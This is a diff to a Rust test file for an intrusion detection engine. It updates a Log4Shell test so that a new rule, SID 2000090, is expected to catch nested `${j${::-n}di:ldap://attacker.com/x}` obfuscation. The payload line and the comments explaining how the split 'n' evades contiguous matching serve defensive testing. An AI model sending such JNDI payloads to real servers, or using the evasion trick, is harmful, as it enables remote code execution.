@@ -243,27 +243,21 @@ fn test_log4shell_raw_jndi_ldap_no_wrapper_detected() {
     );
 }
 
-/// KNOWN BYPASS: deeply nested `${j${::-n}di:ldap://...}` obfuscation.
-/// The `n` character is split into `${::-n}` so neither `${jndi:` nor `jndi:ldap://`
-/// appears as a contiguous substring in the wire bytes — both SID 2000012 and
-/// SID 2000017 miss it. Documented here so future work can address this.
-///
-/// This test asserts the CURRENT (limited) behavior to act as a future-work marker:
-/// if this test starts PASSING (alerts non-empty), great — the engine improved.
-/// If it stays failing then the comment accurately describes the limitation.
+/// SID 2000090 now detects deeply nested `${j${::-n}di:ldap://...}` obfuscation.
+/// The improved regex uses `.{0,50}` wildcards between each JNDI component letter
+/// so it can cross inner `${::-X}` substitution boundaries that previously broke
+/// the `[^\}]*` character class.  This test verifies the bypass is caught.
 #[test]
 fn test_log4shell_deeply_obfuscated_known_bypass() {
     let engine = ids_engine();
-    // `${j${::-n}di:ldap://...}` — no contiguous `${jndi:` or `jndi:ldap://`
+    // `${j${::-n}di:ldap://...}` — nested substitution obfuscation
     let payload = b"GET /?x=${j${::-n}di:ldap://attacker.com/x} HTTP/1.1\r\n";
     let (_, alerts) = engine.inspect(src_ip(), 80, "http", payload);
-    // Currently zero alerts — this is a known limitation of contiguous-pattern matching.
-    // When deeper normalization is added, this assertion should be inverted.
     let fired_sids: Vec<u32> = alerts.iter().map(|a| a.id).collect();
     assert!(
-        fired_sids.is_empty(),
-        "KNOWN BYPASS currently undetected: if this now fires (SIDs {:?}), \
-         the engine improved — remove this assertion and update the comment",
+        fired_sids.contains(&2000090),
+        "SID 2000090 must detect nested `${{j${{::-n}}di:ldap://...}}` obfuscation; \
+         got SIDs: {:?}",
         fired_sids,
     );
 }
